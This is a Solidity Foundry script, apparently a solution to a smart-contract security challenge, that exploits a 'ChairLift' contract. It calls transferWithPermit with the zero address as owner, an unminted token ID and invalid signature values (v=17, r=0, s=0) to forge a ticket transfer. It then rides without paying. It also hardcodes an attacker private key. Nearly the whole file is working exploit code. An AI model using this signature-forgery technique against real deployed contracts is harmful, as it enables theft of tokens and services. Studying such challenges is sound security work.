// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Importing Forge standard libraries and contract dependencies.
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "./src/Setup.sol";
import "./src/Ticket.sol";
import "./src/ChairLift.sol";

/**
 * @title ExploitScript
 * @dev This contract is designed to demonstrate an exploit against the ChairLift contract
 *      using the Ticket contract in a smart contract security challenge.
 */
contract ExploitScript is Script {
    // Contract instances and addresses used in the exploit.
    Setup private set;
    Ticket private ticket;
    address private attacker;
    uint256 private pkattacker = uint256(bytes32(0xa48a253cb6a111ba108bd71b70de3785bb0acec0c9a98c2b67ccbb340c643a50));
    address private chairlift;

    /**
     * @dev Sets up the exploit environment by initializing contracts and labeling addresses.
     */
    function setUp() public override {
        set = new Setup();
        chairlift = address(set.TARGET());
        ticket = Ticket(address(ChairLift(chairlift).ticket()));
        attacker = vm.addr(pkattacker);
    }

    /**
     * @dev Executes the exploit against the ChairLift contract using a forged ticket transfer.
     */
    function run() public override {
        vm.startBroadcast();

        // Define parameters for the ticket transfer.
        uint256 tokenId = 0; // Token ID that has never been minted.
        uint256 deadline = block.timestamp + 1 days; // Signature deadline.
        address from = address(0); // Current owner (supposedly).
        address to = attacker; // Attacker's address.

        // Attempt to transfer the ticket with a forged signature.
        ticket.transferWithPermit(from, to, tokenId, deadline, 17, 0, 0);

        // Take a ride on the ChairLift using the forged ticket.
        ChairLift(chairlift).takeRide(0);

        // Assert that the number of trips taken has increased.
        assert(ChairLift(chairlift).tripsTaken() == 2);

        // Stop broadcasting transactions.
        vm.stopBroadcast();
    }
}
